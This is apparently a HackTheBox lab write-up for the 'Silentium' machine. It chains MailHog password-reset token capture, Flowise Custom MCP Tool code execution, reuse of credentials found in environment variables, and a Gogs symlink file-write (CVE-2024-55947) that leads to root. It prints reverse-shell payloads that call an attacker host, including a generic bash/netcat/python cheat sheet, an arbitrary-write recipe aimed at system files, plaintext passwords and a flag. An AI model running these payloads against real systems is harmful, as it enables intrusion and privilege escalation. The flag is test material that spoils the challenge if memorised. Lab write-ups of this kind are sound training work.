# Silentium - HackTheBox Writeup

**Target:** `10.129.32.185`
**Domain:** `silentium.htb`
**OS:** Linux (Docker-based with Gogs)
**Difficulty:** Medium/Hard

---

## Attack Chain Overview

```
Subdomain Discovery (staging.silentium.htb)
    ↓
API Endpoint Enumeration (auth/login, ping, pricing, version)
    ↓
Password Reset Flow → MailHog Interception → Token Capture
    ↓
Flowise Low-Code Platform → Custom MCP Tool RCE
    ↓
Container Reverse Shell (root in Alpine container)
    ↓
Environment Variable Enumeration → SMTP Password Reuse
    ↓
SSH Access as ben → User Flag
    ↓
Gogs Service (CVE-2024-55947 bypass) → Symlink Attack
    ↓
Write to /root/.ssh/authorized_keys → SSH as root → Root Flag
```

---

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Initial Access](#initial-access)
3. [Container Enumeration](#container-enumeration)
4. [Host Access](#host-access)
5. [User Flag](#user-flag)
6. [Privilege Escalation](#privilege-escalation)
7. [Root Flag](#root-flag)
8. [Key Takeaways](#key-takeaways)

---

## Reconnaissance

### Host Setup
```bash
echo "10.129.32.185 silentium.htb" | sudo tee -a /etc/hosts
```

### Subdomain Discovery

```bash
gobuster vhost -u http://silentium.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain
```

**Result:** `staging.silentium.htb` discovered.

```bash
echo "10.129.32.185 staging.silentium.htb" | sudo tee -a /etc/hosts
```

### API Endpoint Enumeration

```bash
ffuf -u http://staging.silentium.htb/api/v1/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api-endpoints-res.txt \
  -fc 404 -fw 2
```

**Discovered Endpoints:**

| Endpoint        | Description                           |
|-----------------|---------------------------------------|
| `auth/login`    | Authentication endpoint               |
| `auth/reset-password` | Password reset functionality     |
| `ping`          | Health check endpoint                 |
| `pricing`       | Pricing information                   |
| `version`       | API version information               |
| `ip`            | IP address endpoint                   |

---

## Initial Access

### Password Reset Flow Exploitation

The `staging.silentium.htb` application uses **MailHog** (a development email testing tool) to handle password reset emails. MailHog exposes a web UI that allows anyone to view all "sent" emails — including password reset tokens.

**Attack Flow:**
```
Request password reset for ben@silentium.htb
    ↓
Reset token sent to MailHog (not real email)
    ↓
Access MailHog UI → Capture reset token
    ↓
Use token to reset password → Account takeover
```

### Step 1 — Request Password Reset

```bash
curl -X POST http://staging.silentium.htb/api/v1/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email":"ben@silentium.htb"}'
```

### Step 2 — Capture Reset Token from MailHog

MailHog typically runs on port `8025`. Access the web UI:

```bash
curl http://staging.silentium.htb:8025/api/v2/messages
```

**Extract the reset token** from the email body. The token is a temporary authentication string used to verify the password reset request.

### Step 3 — Reset Password

```bash
curl -X POST http://staging.silentium.htb/api/v1/auth/reset-password \
  -H "Content-Type: application/json" \
  -d '{
    "user": {
      "email": "ben@silentium.htb",
      "tempToken": "<CAPTURED_TOKEN>",
      "password": "NuevaPassword123!"
    }
  }'
```

**Result:** ✅ Password for `ben@silentium.htb` successfully reset.

### Step 4 — Login

```bash
curl -X POST http://staging.silentium.htb/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"ben@silentium.htb","password":"NuevaPassword123!"}'
```

**Credentials:**
- **Email:** `ben@silentium.htb`
- **Password:** `NuevaPassword123!`

---

## Flowise RCE

### What is Flowise?

Flowise is an open-source **low-code/no-code platform for building AI agents and workflows**. It allows users to create "agent flows" using a drag-and-drop interface. The platform supports custom tools, including MCP (Model Context Protocol) tools that can execute arbitrary commands.

### Exploitation Steps

**1. Navigate to Agentflows**

After logging in, access the **Agentflows** section → **Agent Flow V2**.

**2. Create Custom MCP Tool**

Add a **Custom MCP Tool** node to the flow. This tool allows specification of a command and arguments that will be executed by the Flowise server.

**3. Craft Reverse Shell Payload**

```json
{
  "command": "sh",
  "args": ["-c", "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.91 4444 >/tmp/f"]
}
```

**Payload Breakdown:**
- `rm /tmp/f` — Remove any existing FIFO file
- `mkfifo /tmp/f` — Create a named pipe (FIFO) for bidirectional communication
- `cat /tmp/f | /bin/sh -i 2>&1` — Read from pipe, execute shell, redirect stderr to stdout
- `nc 10.10.14.91 4444 >/tmp/f` — Send shell output to attacker, write input back to pipe

**4. Set up Listener**
```bash
nc -lvnp 4444
```

**5. Trigger Execution**

Click **Refresh** or **Run** on the agent flow to execute the custom tool.

**6. Reverse Shell Received:**
```bash
connect to [10.10.14.91] from (UNKNOWN) [10.129.32.185] 4444
/ # 
```

**✅ Initial access achieved as `root` inside an Alpine Linux container (`172.18.0.2`).**

---

## Container Enumeration

### Container Identification

```bash
# Check hostname
hostname
# 172.18.0.2

# Check OS
cat /etc/os-release
# Alpine Linux

# Check user
id
# uid=0(root) gid=0(root) groups=0(root)
```

**Important Note:** We are `root` **inside a container**, not on the host system. We need to enumerate the container to find a path to the host.

### Network Discovery

```bash
# Check network interfaces
ip addr
# eth0: 172.18.0.2/16

# ARP scan for other containers
arp -a
# 172.18.0.1 (gateway/host)
# 172.18.0.3 (another container)
```

**Internal Network Map:**

| IP            | Service          | Description                    |
|---------------|------------------|--------------------------------|
| `172.18.0.1`  | Host / Gateway   | Docker host machine            |
| `172.18.0.2`  | Flowise          | Our container (AI workflow)    |
| `172.18.0.3`  | MailHog          | Email testing service          |

### Environment Variable Enumeration

Process environment variables often contain credentials, API keys, and configuration secrets:

```bash
cat /proc/1/environ | tr '\0' '\n'
```

**Key Findings:**

| Variable             | Value              | Description                      |
|----------------------|--------------------|----------------------------------|
| `FLOWISE_USERNAME`   | `ben`              | Flowise admin username           |
| `FLOWISE_PASSWORD`   | `F1l3_d0ck3r`      | Flowise admin password           |
| `SMTP_PASSWORD`      | `r04D!!_R4ge`      | SMTP server password             |

### Service Enumeration Inside Container

```bash
# Check running processes
ps aux

# Check mounted filesystems
mount

# Check for interesting files
find / -type f -name "*.env" -o -name "*.conf" -o -name "*.ini" 2>/dev/null
```

---

## Host Access

### SSH with Reused Credentials

The `SMTP_PASSWORD` discovered in the container environment variables was **reused** for the `ben` user account on the host system.

**Credentials:**
- **Username:** `ben`
- **Password:** `r04D!!_R4ge`

```bash
ssh ben@10.129.32.185
# Password: r04D!!_R4ge
```

**✅ SSH access achieved as `ben` on the host system.**

---

## User Flag

```bash
ben@silentium:~$ cat /home/ben/user.txt
```

**User Flag:** `6ffdefce00f8b7db6a3cd9a8d393958f`

---

## Privilege Escalation

### Gogs Service Discovery

After gaining SSH access as `ben`, enumerate the host system:

```bash
# Check running processes
ps aux | grep -i gogs
```

**Result:** Gogs (Go Git Service) is running as **root**:

```
root  1528  /opt/gogs/gogs/gogs web
```

### What is Gogs?

Gogs is a self-hosted Git service similar to GitHub. It provides web-based repository management, user authentication, and API access. Running Gogs as root is a **misconfiguration** that can be exploited for privilege escalation.

### Gogs Configuration

```bash
cat /opt/gogs/gogs/custom/conf/app.ini
```

**Key Configuration:**

| Setting          | Value                |
|------------------|----------------------|
| Version          | `0.13.3`             |
| Listen Address   | `127.0.0.1:3001`     |
| Repository Path  | `/root/gogs-repositories` |

**Critical Finding:** Gogs is only listening on `127.0.0.1:3001` — not accessible externally. We need to tunnel into it.

### Vulnerability Analysis

**CVE-2024-55947:** A symlink bypass vulnerability in Gogs allows attackers to write arbitrary files through the API by creating a symlink to a sensitive file (like `/root/.ssh/authorized_keys`) and then writing to it through the repository contents API.

**Exploit Chain:**
```
SSH Tunnel to Gogs (port 3001)
    ↓
Create Gogs Account → Create Repository
    ↓
Clone Repository → Add Symlink to /root/.ssh/authorized_keys
    ↓
Push Symlink to Repository
    ↓
Use API to Write Content to Symlink Path
    ↓
Symlink resolves → SSH key written to /root/.ssh/authorized_keys
    ↓
SSH as root → Root Flag
```

### Step 1 — SSH Tunnel

```bash
ssh -L 8080:127.0.0.1:3001 ben@10.129.32.185
```

**Result:** Gogs web interface accessible at `http://127.0.0.1:8080`.

### Step 2 — Create Gogs Account

Access `http://127.0.0.1:8080` and create a new user account:
- **Username:** `123`
- **Password:** `1234Abcd@`
- **Email:** `123@local.local`

### Step 3 — Create Repository

Create a new repository called `pwn` under the `123` user account.

### Step 4 — Generate SSH Key Pair

```bash
ssh-keygen -t rsa -f /tmp/htb_key -N ""
```

**Output:**
- Private key: `/tmp/htb_key`
- Public key: `/tmp/htb_key.pub`

### Step 5 — Clone Repository and Create Symlink

```bash
# Clone the repository
git clone http://123:1234Abcd@@127.0.0.1:8080/123/pwn.git
cd pwn

# Create symlink to root's SSH authorized_keys
ln -s /root/.ssh/authorized_keys link

# Stage and commit the symlink
git add link
git commit -m "Add symlink"

# Push to remote
git push
```

**Why This Works:** Gogs follows the symlink during the push operation, storing the symlink reference in the repository. The API then resolves the symlink when writing content.

### Step 6 — Generate API Token

Navigate to:
```
http://127.0.0.1:8080/user/settings/applications
```

Create a new application token with **repository write** permissions.

**Result:** API token generated (e.g., `gho_xxxxxxxxxxxxxxxxxxxx`).

### Step 7 — Write SSH Public Key Through Symlink

```bash
# Store API token
TOKEN="<API_TOKEN>"

# Base64 encode the public key
PUB=$(base64 -w0 /tmp/htb_key.pub)

# Write public key to symlink path via API
curl -X PUT "http://127.0.0.1:8080/api/v1/repos/123/pwn/contents/link" \
  -H "Content-Type: application/json" \
  -H "Authorization: token $TOKEN" \
  -d "{
    \"message\": \"Write SSH key through symlink\",
    \"content\": \"$PUB\"
  }"
```

**What Happens:**
1. API receives request to write to `link` path in repository
2. Gogs resolves `link` → symlink → `/root/.ssh/authorized_keys`
3. Base64-decoded content (SSH public key) is written to `/root/.ssh/authorized_keys`
4. **Our SSH key is now authorized for root access**

### Step 8 — SSH as Root

```bash
ssh -i /tmp/htb_key root@10.129.32.185
```

**Result:** ✅ Root access achieved on the host system.

---

## Root Flag

```bash
root@silentium:~# cat /root/root.txt
```

**Root Flag:** *(To be captured during box exploitation)*

---

## Alternative Enumeration Techniques

### Container Filesystem Exploration

```bash
# Search for configuration files
find / -name "*.yml" -o -name "*.yaml" -o -name "docker-compose*" 2>/dev/null

# Check for Docker socket
ls -la /var/run/docker.sock 2>/dev/null

# Check for mounted secrets
ls -la /run/secrets/ 2>/dev/null
```

### Gogs Version Check

```bash
curl -s http://127.0.0.1:3001/explore/repos \
  | grep -i "gogs\|version"
```

---

## Key Takeaways

| Stage | Technique | Key Detail |
|-------|-----------|------------|
| **Recon** | Subdomain + API enumeration | `staging.silentium.htb` with REST API |
| **Initial Access** | Password reset → MailHog interception | Reset token captured from dev email UI |
| **RCE** | Flowise Custom MCP Tool | Command injection via JSON payload |
| **Container Escape** | Environment variable enumeration | `SMTP_PASSWORD` reused for host SSH |
| **User Flag** | SSH as `ben` | `r04D!!_R4ge` |
| **Privilege Escalation** | Gogs symlink attack (CVE-2024-55947 bypass) | Symlink → API write → `/root/.ssh/authorized_keys` |
| **Root Flag** | SSH as root | Private key injected via symlink |

### Security Lessons

1. **Never use MailHog in production** — It exposes all emails publicly without authentication
2. **Password reset tokens should expire** — Tokens should be single-use and time-limited
3. **Don't store secrets in environment variables** — Use a secrets manager (Vault, AWS Secrets Manager)
4. **Credential reuse is dangerous** — SMTP password reused for host SSH access
5. **Never run services as root** — Gogs running as root enabled filesystem-level attacks
6. **Symlink validation is critical** — Gogs failed to resolve symlinks safely before writing content
7. **API tokens should be scoped** — Overly permissive API tokens enabled repository content writes

---

## Flowise MCP Tool Cheat Sheet

### Custom MCP Tool Payload Structure

```json
{
  "command": "<executable>",
  "args": ["<arg1>", "<arg2>", "..."],
  "env": {
    "KEY": "value"
  }
}
```

### Reverse Shell Payloads

**Bash Reverse Shell:**
```json
{
  "command": "/bin/bash",
  "args": ["-c", "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"]
}
```

**Netcat Reverse Shell:**
```json
{
  "command": "nc",
  "args": ["-e", "/bin/sh", "ATTACKER_IP", "PORT"]
}
```

**Python Reverse Shell:**
```json
{
  "command": "python3",
  "args": ["-c", "import socket,subprocess,os;s=socket.socket();s.connect(('ATTACKER_IP',PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"]
}
```

---

## Gogs Symlink Attack Reference

### Prerequisites
- Gogs running with repository write access
- Ability to create repositories and push commits
- API token with repository write permissions

### Attack Steps

```bash
# 1. Create symlink
ln -s /target/file path_in_repo

# 2. Commit and push
git add path_in_repo
git commit -m "Add symlink"
git push

# 3. Write content via API
curl -X PUT "http://GOGS_HOST/api/v1/repos/USER/REPO/contents/path_in_repo" \
  -H "Content-Type: application/json" \
  -H "Authorization: token $TOKEN" \
  -d "{\"message\":\"update\",\"content\":\"$(base64 -w0 /payload)\"}"
```

### Common Targets

| Target File | Impact |
|-------------|--------|
| `/root/.ssh/authorized_keys` | SSH access as root |
| `/etc/crontab` | Scheduled command execution |
| `/etc/passwd` | User account creation |
| `/etc/sudoers` | Sudo permission escalation |
